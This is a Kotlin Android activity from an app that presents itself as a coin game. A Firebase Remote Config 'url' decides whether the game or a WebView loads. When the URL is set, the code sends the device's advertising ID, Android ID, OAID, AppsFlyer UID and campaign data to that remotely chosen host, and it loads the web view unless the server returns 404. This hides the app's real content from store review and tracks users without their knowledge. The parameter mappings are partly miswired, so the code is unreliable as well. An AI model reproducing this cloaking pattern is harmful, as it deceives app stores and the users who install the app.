package com.minicoin.minimaster.presenters

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.minicoin.minimaster.R
import com.minicoin.minimaster.data.Constants.MYAPP
import com.minicoin.minimaster.data.Constants.appsData
import com.minicoin.minimaster.data.Constants.apps_key
import com.minicoin.minimaster.data.Constants.clientToken
import com.minicoin.minimaster.data.Constants.fins
import com.minicoin.minimaster.data.Constants.mainAFT
import com.minicoin.minimaster.network.ChromeClient
import com.minicoin.minimaster.network.WebActivity
import com.minicoin.minimaster.utills.SaveUtil
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.*

class CheckActivity : ChromeClient.MainWebClient() {

    private val job = SupervisorJob()
    private val ioScope by lazy { CoroutineScope(job + Dispatchers.Main) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_check)

        networkRemoteConfig()
        initAppsFlyer()
        SaveUtil.init(this)
    }

    // TODO Firebase RemoteConfig
    @OptIn(DelicateCoroutinesApi::class)
    private fun networkRemoteConfig() {

        val mFRC = FirebaseRemoteConfig.getInstance()
        val configSettings =
            FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(2500).build()

        mFRC.setConfigSettingsAsync(configSettings)
        mFRC.fetchAndActivate().addOnCompleteListener(this) { task ->

            if (task.isSuccessful) {
                val a = mFRC.getString("url")
                Log.d("fireLink", "fireLinkAAAA=:$a")

                //if (mFRC.getString("url").isEmpty()) {
                if (mFRC.getString("url").isNotEmpty()) {

                    dataLink = mFRC.getString("url")
                    Hawk.put("dataLink", dataLink)
                    Log.d("fireLink", "fireLink=:$dataLink")

//                    dataFBid = mFRC.getString("fbid")
//                    Hawk.put("fbid", dataFBid)
//                    Log.d("fireFBID", "fireFBID=:$dataFBid")

//                    clientToken = mFRC.getString("other")
//                    Hawk.put("fireClientToken", "fireClientToken=$clientToken")
//                    Log.d("fireClientToken", "fireClientToken=:$clientToken")

                    ioScope.launch {
                        initSettings()
                    }

                    // TODO REWRITE
                    GlobalScope.launch(Dispatchers.IO) {
                        someURL()
                    }

                    //TODO Write use-case with empty URL
                } else {
                    Handler(Looper.getMainLooper()).postDelayed({
                        startGame()
                        Log.d("fireFRC", "Empty URL startGame")

                        // TODO Checking
                        dataLink = mFRC.getString("url")
                        Log.d("fireLink", "fireLink=:$dataLink")

                    }, 3000)
                }
            } else {
                Log.d("fireOther", "Fetch failed =:$clientToken")
                startGame()
            }
        }
    }

    companion object {
        var dataLink = ""
        var dataFBid = ""
        //var dataOthers = ""
    }

    private fun initAppLink() {
        AppLinkData.fetchDeferredAppLinkData(this) { linkData ->
            fins = Objects.requireNonNull(linkData?.targetUri).toString().replace(MYAPP, "")
        }
    }

    private fun initSettings() {
        if (dataFBid.isNotEmpty()) {
        //if (dataFBid == "somefbid") {
            FacebookSdk.setApplicationId(dataFBid)
            FacebookSdk.setClientToken(clientToken)
            FacebookSdk.setAdvertiserIDCollectionEnabled(true)
            FacebookSdk.sdkInitialize(this)
            FacebookSdk.setAutoInitEnabled(true)
            FacebookSdk.fullyInitialize()
            FacebookSdk.setAutoLogAppEventsEnabled(true)
            AppEventsLogger.activateApp(application)

            // deepLink
            ioScope.launch {
                initAppLink()
            }
        }
    }

    private fun initAppsFlyer() {
        val af = AppsFlyerLib.getInstance()
        af.setDebugLog(true)
        af.init(apps_key, object : AppsFlyerConversionListener {

            @SuppressLint("SetJavaScriptEnabled")
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                appsData = p0!!
                Log.d("test123", "onConversionDataSuccess: $p0")
                Log.d("test123", "onConversionDataSuccess: $appsData")
            }

            override fun onConversionDataFail(p0: String?) {}
            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
            override fun onAttributionFailure(p0: String?) {}
        }, this)
        af.start(this)
    }


    private fun someURL() {
        val totalLink = StringBuilder()

        var afAd = "null"
        var afAdId = "null"
        var afAdset = "null"
        var afAdsetId = "null"
        var afKeywords = "null"
        var afOs = "null"
        var afPrt = "null"
        var afRef = "null"
        var camp = "null"
        var clickId = "null"
        var pid = "null"
        var advId = "null"
        var afAndroiUrl = "null"
        var androidId = "null"
        var oaid = "null"
        var indice = 1
        var count = 1

        var uid = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        Log.d("uid", "total uid (apps id)= $uid")
        var advertiserId = "null"

        for (attrName in appsData.keys) {
            afAd = appsData["af_ad_id"].toString()
            afAdId = appsData["af_adset"].toString()
            afAdset = appsData["af_adset_id"].toString()
            afAdsetId = appsData["af_keywords"].toString()
            afKeywords = appsData[""].toString()
            afOs = appsData["af_os"].toString()
            afPrt = appsData["af_prt"].toString()
            afRef = appsData["af_ref"].toString()
            camp = appsData["campaign"].toString()
            clickId = appsData["clickid"].toString()
            pid = appsData["pid"].toString()
            advId = appsData["advertising_id"].toString()
            afAndroiUrl = appsData["af_android_url"].toString()
            androidId = appsData["android_id"].toString()
            oaid = appsData["oaid"].toString()
            advertiserId = appsData["advertiserId"].toString()
        }
        val strs = camp.split("_").toTypedArray()

        totalLink.append("?af_ad=$afAd")
        totalLink.append("&af_ad_id=$afAdId")
        totalLink.append("&af_adset=$afAdset")
        totalLink.append("&af_adset_id=$afAdsetId")
        totalLink.append("&af_keywords=$afKeywords")
        totalLink.append("&af_os=$afOs")
        totalLink.append("&af_prt=$afPrt")
        totalLink.append("&af_ref=$afRef")
        totalLink.append("&c=$camp")
        totalLink.append("&clickid=$clickId")
        totalLink.append("&pid=$pid")
        totalLink.append("&advertising_id=$advId")
        totalLink.append("&af_android_url=$afAndroiUrl")
        totalLink.append("&android_id=$androidId")
        totalLink.append("&oaid=$oaid")
        totalLink.append("&uid=$uid")
        totalLink.append("&advertiserId=$advertiserId")

        if (!fins.equals("", ignoreCase = true)) {
            totalLink.append("&afsub$count=$fins")
        } else {
            try {
                for (i in strs) {
                    totalLink.append("&afsub$count=${strs[indice]}")
                    indice++
                    indice++
                    count++
                }
            } catch (e: Exception) {
                Log.d("catch", "catch exception in apps")
            }
        }

        mainAFT = "$dataLink?$totalLink"
        Log.d("link", "totalLink AFT2= $dataLink?$totalLink")

        // TODO From FRC
        val url = URL("$mainAFT")
        Log.d("link core", "link mainAFT = $mainAFT")

        val connection: HttpURLConnection = url.openConnection() as HttpURLConnection
        connection.requestMethod = "GET"
        connection.connect()

        val codeWebPage: Int = connection.responseCode
        Log.d("codeOfWebPage", "Web page: $codeWebPage")


        //TODO DON'T FORGET TO CHANGE
        if (codeWebPage == 404) {
//            startGame()
//            Log.d("codeOfWebPage", "Web page select GameActivity: $codeWebPage")
            // TODO Use-case without SSL certificate
            try {
                startGame()
                Log.d("codeOfWebPage", "Web page select GameActivity: $codeWebPage")
            } catch(e: Exception) {
                startGame()
                Log.d("codeOfWebPage", "Without SSL: $codeWebPage")
            }
        } else {
            Log.d("codeOfWebPage", "Web page select WebView: $codeWebPage")
            startWeb()
        }

    }

    private fun startWeb() {
        startActivity(Intent(this, WebActivity::class.java))
        finish()
    }

    private fun startGame() {
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }

}